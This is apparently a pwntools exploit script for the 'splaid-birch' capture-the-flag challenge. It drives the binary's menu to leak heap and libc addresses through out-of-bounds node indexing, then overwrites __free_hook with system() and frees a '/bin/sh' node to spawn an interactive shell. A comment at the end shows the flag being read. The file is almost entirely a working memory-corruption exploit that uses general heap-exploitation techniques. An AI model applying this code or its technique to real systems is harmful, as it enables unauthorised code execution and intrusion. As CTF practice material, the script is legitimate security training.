from pwn import *


DEBUG = True

birch = ELF('./splaid-birch')
libsplaid = ELF('./libsplaid.so.1')
libc = ELF('./libc.so.6')

context.update(arch="amd64", os="linux", bits=64)


def case_0():
    """
    exit
    """
    p.sendline('0')

def case_1(key):
    """
    delete via key
    """
    p.sendline('1')
    p.sendline(str(key))

def case_2(key):
    """
    get via key and print
    """
    p.sendline('2')
    p.sendline(str(key))

def case_3(n):
    """
    get nth element key and print
    """
    p.sendline('3')
    p.sendline(str(n))

def case_4(n):
    """
    sp_select
    gets nth element value and print
    """
    p.sendline('4')
    p.sendline(str(n))

def case_5(key, value):
    """
    add key, value
    """
    p.sendline('5')
    p.sendline(str(key))
    p.sendline(str(value))

def case_6(a, b):
    """
    calculates sum
    """
    p.sendline('6')
    p.sendline(str(a))
    p.sendline(str(b))

def case_7(a ,b, c):
    """
    stores `a` at the root node
    """
    p.sendline('7')
    p.sendline(str(a))
    p.sendline(str(b))
    p.sendline(str(c))


def leak_heap_ptr():
    # trigger realloc
    N = 11
    # set to -2 to easily have 0 as the 3rd element
    for i in range(-2, N - 2):
        case_5(i, i)

    # print 10
    case_2(10)
    p.recv()

    # change root to node at offset
    #   offset for nodes[0].body.left is at -0x67*8
    offset = -0x67
    case_4(offset)
    p.recv()

    # print heap leak
    case_3(0)
    r = p.recv().rstrip('\n')
    addr = int(r.split('\n')[-1])

    # set root back
    case_4(0)
    p.recv()

    return addr


def leak_libc_ptr(heap_base, n=11):
    # offset from heap base for leak
    libc_heap_offset = 0x30b0
    libc_heap_addr = heap_base + libc_heap_offset - 0x10

    # create a new node with the address
    case_5(libc_heap_addr, libc_heap_addr)

    # add up to 161 nodes
    for i in range(n+1, 161):
        case_5(i, i)

    # set to -0x6fa, offset where node `n` is at
    offset = -0x37d0/8
    case_4(offset)
    r = p.recv()

    # key at this offset is always 0x4e due to previous setup
    key = 0x4e
    value = int(r.rstrip('\n'))

    # calculate libc address
    case_2(key)
    r = p.recv()
    libc_addr = int(r.rstrip('\n')) - value

    # reset base
    case_4(0)
    p.recv()

    # clean up to remove malloc issues
    case_1(libc_heap_addr)

    return libc_addr


if __name__ =='__main__':
    if DEBUG:
        p = process('./splaid-birch', env={'LD_PRELOAD':'./libsplaid.so.1:./libc.so.6'})
    else:
        p = remote('splaid-birch.pwni.ng', 17579)


    # get heap leak
    heap_addr = leak_heap_ptr()     # note: this does 11 adds
    print " === HEAP LEAK: ",hex(heap_addr)," === "
    heap_base_addr = heap_addr - 0x12f8

    # get libc leak
    libc_addr = leak_libc_ptr(heap_base_addr)
    print " === LIBC LEAK: ",hex(libc_addr)," === "
    system_addr = libc_addr - 0x39c860
    environ_addr = system_addr + 0x39ec58
    free_hook = system_addr + 0x39e4a8


    # create a new node with the address - 0x10
    node_addr = free_hook - 0x10
    bin_sh = unpack('/bin/sh\x00')
    case_5(bin_sh, node_addr)

    # force root our to new node
    offset = -0x37d0/8 + 1
    case_4(offset)
    p.recv()

    # write system to free_hook
    case_7(system_addr, 0, 0)

    # reset base
    case_4(0)
    p.recv()

    # call system via free
    case_1(bin_sh)

    p.interactive()
    p.close()
"""
$ cat /home/splaid/flag.txt
PCTF{7r335_0n_h34p5_0n_7r335_0n_5l3470r}
"""
